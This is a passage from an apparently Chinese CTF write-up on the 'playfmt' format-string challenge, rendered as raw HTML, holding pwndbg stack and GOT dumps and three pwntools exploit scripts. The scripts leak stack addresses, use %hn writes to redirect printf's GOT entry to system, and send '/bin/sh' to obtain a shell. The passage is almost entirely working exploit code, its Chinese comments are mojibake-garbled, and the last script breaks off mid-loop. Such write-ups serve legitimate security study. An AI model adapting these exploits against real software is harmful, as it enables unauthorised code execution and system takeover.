‚Üì   0x8048501 &lt;do_fmt+6>     sub    esp, 4   0x8048504 &lt;do_fmt+9>     push   0xc8   0x8048509 &lt;do_fmt+14>    push   buf &lt;0x804a060>   0x804850e &lt;do_fmt+19>    push   0   0x8048510 &lt;do_fmt+21>    call   read@plt &lt;0x8048390>   0x8048515 &lt;do_fmt+26>    add    esp, 0x10   0x8048518 &lt;do_fmt+29>    sub    esp, 4   0x804851b &lt;do_fmt+32>    push   4‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ STACK ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ00:0000‚îÇ esp  0xffa077c0 ‚Äî‚ñ∏ 0x804a060 (buf) ‚óÇ‚Äî 0x31313225 ('%211')01:0004‚îÇ      0xffa077c4 ‚Äî‚ñ∏ 0x8048640 ‚óÇ‚Äî jno    0x80486b7 /* 'quit' */02:0008‚îÇ      0xffa077c8 ‚óÇ‚Äî 0x403:000c‚îÇ      0xffa077cc ‚Äî‚ñ∏ 0x804857c (play+51) ‚óÇ‚Äî add    esp, 0x1004:0010‚îÇ      0xffa077d0 ‚Äî‚ñ∏ 0x8048645 ‚óÇ‚Äî cmp    eax, 0x3d3d3d3d05:0014‚îÇ      0xffa077d4 ‚Äî‚ñ∏ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî 0x1b2db006:0018‚îÇ ebp  0xffa077d8 ‚Äî‚ñ∏ 0xffa077e8 ‚Äî‚ñ∏ 0xffa077f8 ‚óÇ‚Äî 0x007:001c‚îÇ      0xffa077dc ‚Äî‚ñ∏ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ‚Äî‚ñ∏ 0xf7d37b30 (system) ‚óÇ‚Äî sub    esp, 0xc‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ BACKTRACE ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚ñ∫ f 0  8048540 do_fmt+69   f 1  804a010 _GLOBAL_OFFSET_TABLE_+16   f 2 f7eb0d60 _IO_2_1_stdout_   f 3  804a012 _GLOBAL_OFFSET_TABLE_+18   f 4 f7eb03dc __exit_funcs   f 5 ffa07810   f 6 f7d15276 __libc_start_main+246pwndbg> stack 2500:0000‚îÇ esp  0xffa077c0 ‚Äî‚ñ∏ 0x804a060 (buf) ‚óÇ‚Äî 0x31313225 ('%211')01:0004‚îÇ      0xffa077c4 ‚Äî‚ñ∏ 0x8048640 ‚óÇ‚Äî jno    0x80486b7 /* 'quit' */02:0008‚îÇ      0xffa077c8 ‚óÇ‚Äî 0x403:000c‚îÇ      0xffa077cc ‚Äî‚ñ∏ 0x804857c (play+51) ‚óÇ‚Äî add    esp, 0x1004:0010‚îÇ      0xffa077d0 ‚Äî‚ñ∏ 0x8048645 ‚óÇ‚Äî cmp    eax, 0x3d3d3d3d05:0014‚îÇ      0xffa077d4 ‚Äî‚ñ∏ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî 0x1b2db006:0018‚îÇ ebp  0xffa077d8 ‚Äî‚ñ∏ 0xffa077e8 ‚Äî‚ñ∏ 0xffa077f8 ‚óÇ‚Äî 0x007:001c‚îÇ      0xffa077dc ‚Äî‚ñ∏ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ‚Äî‚ñ∏ 0xf7d37b30 (system) ‚óÇ‚Äî sub    esp, 0xc08:0020‚îÇ      0xffa077e0 ‚Äî‚ñ∏ 0xf7eb0d60 (_IO_2_1_stdout_) ‚óÇ‚Äî 0xfbad288709:0024‚îÇ      0xffa077e4 ‚óÇ‚Äî 0x00a:0028‚îÇ      0xffa077e8 ‚Äî‚ñ∏ 0xffa077f8 ‚óÇ‚Äî 0x00b:002c‚îÇ      0xffa077ec ‚Äî‚ñ∏ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ‚óÇ‚Äî 0xc870f7d30c:0030‚îÇ      0xffa077f0 ‚Äî‚ñ∏ 0xf7eb03dc (__exit_funcs) ‚Äî‚ñ∏ 0xf7eb11e0 (initial) ‚óÇ‚Äî 0x00d:0034‚îÇ      0xffa077f4 ‚Äî‚ñ∏ 0xffa07810 ‚óÇ‚Äî 0x10e:0038‚îÇ      0xffa077f8 ‚óÇ‚Äî 0x00f:003c‚îÇ      0xffa077fc ‚Äî‚ñ∏ 0xf7d15276 (__libc_start_main+246) ‚óÇ‚Äî add    esp, 0x1010:0040‚îÇ      0xffa07800 ‚óÇ‚Äî 0x111:0044‚îÇ      0xffa07804 ‚Äî‚ñ∏ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî 0x1b2db012:0048‚îÇ      0xffa07808 ‚óÇ‚Äî 0x013:004c‚îÇ      0xffa0780c ‚Äî‚ñ∏ 0xf7d15276 (__libc_start_main+246) ‚óÇ‚Äî add    esp, 0x1014:0050‚îÇ      0xffa07810 ‚óÇ‚Äî 0x115:0054‚îÇ      0xffa07814 ‚Äî‚ñ∏ 0xffa078a4 ‚Äî‚ñ∏ 0xffa077dc ‚Äî‚ñ∏ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ‚óÇ‚Äî 0xf7d37b3016:0058‚îÇ      0xffa07818 ‚Äî‚ñ∏ 0xffa078ac ‚Äî‚ñ∏ 0xffa077ec ‚Äî‚ñ∏ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ‚óÇ‚Äî 0xc870f7d317:005c‚îÇ      0xffa0781c ‚óÇ‚Äî 0x0... ‚Üìpwndbg> gotGOT protection: Partial RELRO | GOT functions: 6[0x804a00c] read@GLIBC_2.0 -> 0xf7dd3c50 (read) ‚óÇ‚Äî cmp    dword ptr gs:[0xc], 0[0x804a010] printf@GLIBC_2.0 -> 0xf7d37b30 (system) ‚óÇ‚Äî sub    esp, 0xc[0x804a014] puts@GLIBC_2.0 -> 0xf7d5c870 (puts) ‚óÇ‚Äî push   ebp[0x804a018] __libc_start_main@GLIBC_2.0 -> 0xf7d15180 (__libc_start_main) ‚óÇ‚Äî push   ebp[0x804a01c] setvbuf@GLIBC_2.0 -> 0xf7d5cff0 (setvbuf) ‚óÇ‚Äî push   ebp[0x804a020] strncmp@GLIBC_2.0 -> 0xf7e3a5d0 (__strncmp_sse4_2) ‚óÇ‚Äî push   ebp'''</span><span class="token comment" spellcheck="true">#  gdb.attach(io, "b *do_fmt+64\nc")</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hhn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x7</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'44444444\0'</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"33333333"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"44444444"</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh\0"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true">#‰ΩúËÄÖÔºö23R3F</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>  printf_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>  p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"**********leak printf_got************"</span><span class="token punctuation">)</span> payload <span class="token operator">=</span> <span class="token string">'%6$x'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ebp2 <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>ebp1 <span class="token operator">=</span> ebp2 <span class="token operator">-</span> <span class="token number">0x10</span>fmt_7 <span class="token operator">=</span> ebp2 <span class="token operator">-</span><span class="token number">0x0c</span>fmt_11 <span class="token operator">=</span> ebp2 <span class="token operator">+</span> <span class="token number">0x04</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"printf_got-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ebp_1-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>ebp1<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ebp_2-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>ebp2<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"fmt_7-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>fmt_7<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"fmt_11-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>fmt_11<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fmt_7 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%6$hn'</span><span class="token comment" spellcheck="true">#ebp2 = fmt_7</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#Áî±‰∫éebp2Â∑≤ÁªèÊåáÂêë‰∫Üfmt_7ÔºåÊâÄ‰ª•‰øÆÊîπÂÅèÁßªÈáè10Â§ÑÁöÑebp2Âç≥‰øÆÊîπfmt_7</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>printf_got <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hn'</span><span class="token comment" spellcheck="true">#fmt_7 = prinf_got</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token triple-quoted-string string">'''Ëøô‰∏™Âæ™ÁéØÁî®‰∫é‰øùËØÅÊâÄÊúâÁöÑÂ≠óËäÇÈÉΩË¢´ËæìÂá∫ÔºåÂõ†‰∏∫recvÔºàÔºâ‰∏ÄÊ¨°ÊúÄÂ§öÂè™ËÉΩÊé•Êî∂0x1000‰∏™Â≠óËäÇÔºåÊâÄ‰ª•Ë¶ÅËøõË°åÂ§öÊ¨°recvÔºàÔºâÊâçËÉΩ‰øùËØÅÂÖ®ÈÉ®Â≠óËäÇÈÉΩËæìÂá∫‰ª•‰æøËøõË°å‰∏ãÈù¢ÁöÑÊìç‰ΩúÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåË¶ÅÊûÑÈÄ†‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤‚Äú23r3f‚ÄùÊù•‰ΩúÊ†áÂøóÔºåËøîÂõûÁöÑÂ§ßÈáèÂ≠óÁ¨¶‰∏≤‰∏≠Â¶ÇÊûúÂåÖÂê´‰∫ÜËøô‰∏™Â≠óÁ¨¶‰∏≤ÈÇ£‰πàËØ¥Êòé‰πãÂâçÊûÑÈÄ†ÁöÑ%nÂÜôÂÖ•Â∑≤ÁªèÂÆåÊàê'''</span> payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fmt_11 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%6$hn'</span><span class="token comment" spellcheck="true">#ebp2 = fmt_11</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hn'</span><span class="token comment" spellcheck="true">#fmt_11 = prinf_got + 2</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"******leaking the print_got_add*********"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'aaaa%7$s'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>printf_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"print_got_add is:[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> printf_addr <span class="token operator">-</span> printf_libc <span class="token operator">+</span> system_libclog<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_add is:[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pause()</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span>str<span class="token punctuation">(</span>system_addr <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'c%7$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>system_addr<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>system_addr <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'c%11$hn'</span><span class="token triple-quoted-string string">'''ËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÊàë‰ª¨ÊääsystemÁöÑÂú∞ÂùÄÁöÑÂâçÂêé‰∏§‰∏™Â≠óËäÇÂàÜÂà´ÂÜôÂà∞fmt-7Âíåfmt-11‰∏≠ÔºåÂú®ÂÜôÂÖ•Âêé‰∏§‰∏™Â≠óËäÇÁöÑÊó∂ÂÄôË¶ÅÊ≥®ÊÑèÂáèÂéªÂâçÈù¢ËæìÂÖ•ÁöÑ(system_addr &amp;0xffff))ÔºåËøôÊòØÂõ†‰∏∫%nÂÜôÂÖ•Êìç‰ΩúÊòØÁÆóÁ¥ØÁßØËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏™Êï∞'''</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''Ëøô‰∏™Êó∂ÂÄôËæìÂÖ•ÂèÇÊï∞Âà∞Ê†à‰∏≠ÔºåÊú¨Êù•‰∏ã‰∏ÄÊ≠•Á®ãÂ∫è‰ºöË∞ÉÁî®printfÂáΩÊï∞Ôºå‰ΩÜÊòØÊ≠§Êó∂printfÂáΩÊï∞ÁöÑgotË°®Â∑≤ÁªèË¢´‰øÆÊîπ‰∏∫systemÁöÑÂú∞ÂùÄ‰∫ÜÔºåÊ≠§Êó∂Â∞±‰ºöÊâßË°åsystemÂπ∂‰∏î‰ªéÊ†à‰∏≠Âèñbin/shÂèÇÊï∞‰∫éÊòØÂ∞±ËøôÊ†∑getshell'''</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#veritas501 --exp</span><span class="token comment" spellcheck="true">#coding = utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'terminator'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'bash'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>p_printf <span class="token operator">=</span> <span class="token number">0x0804A010</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so'</span><span class="token punctuation">)</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">'%6$x'</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>p_ebp2 <span class="token operator">=</span> int<span class="token punctuation">(</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#10</span>p_7 <span class="token operator">=</span> p_ebp2<span class="token number">-0xc</span><span class="token comment" spellcheck="true">#7</span>p_11 <span class="token operator">=</span> p_ebp2<span class="token operator">+</span><span class="token number">4</span><span class="token comment" spellcheck="true">#11</span>p_ebp1 <span class="token operator">=</span> p_ebp2<span class="token number">-0x10</span><span class="token comment" spellcheck="true">#6</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_7<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%6$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_ebp2->p_7</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_printf<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%10$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_7->p_printf</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_11<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%6$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_ebp2->p_11</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>p_printf<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%10$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_11->p_printf+2</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'here\x00'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>pay <span class="token operator">=</span> <span class="token string">"aaaa%7$s\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>printf <span class="token operator">=</span> u32<span class="token punctuation">(</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>printf<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leak printf</span>system <span class="token operator">=</span> printf<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>system<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%7$hn"</span> pay <span class="token operator">+=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>system<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>system<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%11$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#hijack printf->system</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        